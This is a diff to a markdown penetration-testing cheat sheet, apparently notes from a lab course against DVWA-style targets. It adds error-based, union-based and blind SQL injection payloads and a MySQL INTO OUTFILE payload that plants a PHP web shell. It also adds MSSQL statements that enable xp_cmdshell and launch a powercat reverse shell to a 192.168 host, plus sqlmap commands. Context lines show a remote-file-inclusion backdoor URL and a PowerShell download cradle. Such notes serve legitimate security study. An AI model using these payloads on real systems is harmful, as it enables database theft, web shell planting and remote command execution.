@@ -203,6 +203,10 @@ index.php?page=http://192.168.45.235/simple-backdoor.php&cmd=ls
 
 ### Using Executable Files
 
+```bash
+xxd shell.php | more
+```
+
 ### Using Non-Executable Files
 
 ```bash
@@ -250,7 +254,26 @@ IEX%20(New-Object%20System.Net.Webclient).DownloadString(%22http%3A%2F%2F192.168
 select * from users where username='admin' or 1=1 limit 0,1;#
 ```
 
+### error based
+
+```sql
+or 1=1 in (select @@version);#
+or 1=1 in (select database());#
+or 1=1 in (select table_name from information_schema.tables where table_schema=database());#
+or 1=1 in (select column_name from information_schema.columns where table_name='users');#
+or 1=1 in (select username from dvwa.users);#
+```
+
 ### union based
+
+For UNION SQLi attacks to work, we first need to satisfy two conditions:
+
+1. The injected UNION query has to include the same number of columns as the original query.
+2. The data types need to be compatible between each column.
+
+```sql
+union select null, table_name, column_name, table_schema, null from information_schema.columns where table_schema=database() -- //
+```
 
 ```sql
 select * from users where username='admin' or 1=1 order by 3;#
@@ -266,8 +289,53 @@ union select username,password,3 from dvwa.users;#
 id = 1 union select table_name,2,3 from information_schema.tables where table_schema=0x64767761;#
 ```
 
+### blind injection
+
+#### boolean-based
+
+```sql
+select * from users where username='admin' and substring(database(),1,1)='d';#
+id=1 and substring(bin(ascii(substring(database(),1,1))),1,1)=1;#
+```
+
+#### time-based
+
+```sql
+select * from users where username='admin' and sleep(5);#
+
+a'; waitfor delay '00:00:10' ;--
+a'; EXECUTE sp_configure 'show advanced options', 1 ;--
+a'; RECONFIGURE ;--
+a'; EXECUTE sp_configure 'xp_cmdshell', 1 ;--
+a'; RECONFIGURE ;--
+
+a'; EXEC xp_cmdshell 'powercat -c 192.168.45.201 -p 4444 -e cmd' ;--
+
+a'; EXEC xp_cmdshell 'TIMEOUT /T 5 /NOBREAK'; --
+
+```
+
+### get shell
+
+#### mysql
+
+```sql
+' UNION SELECT "<?php system($_GET['cmd']);?>", null, null, null, null INTO OUTFILE "/var/www/html/tmp/webshell.php" -- //
+```
+
+#### sql server
+
+```sql
+EXECUTE sp_configure 'show advanced options', 1;
+RECONFIGURE;
+EXECUTE sp_configure 'xp_cmdshell', 1;
+RECONFIGURE;
+```
+
 ### sqlmap
 
 ```bash
-sqlmap -u "http://" --data="username=admin&password=admin&Login=Login" --cookie="security=low; PHPSESSID=1" --level=5 --risk=3 --dbs
+sqlmap -u http://192.168.50.19/blindsqli.php?user=1 -p user
+
+sqlmap -r a.txt -p "weight,height,age,email"
 ```
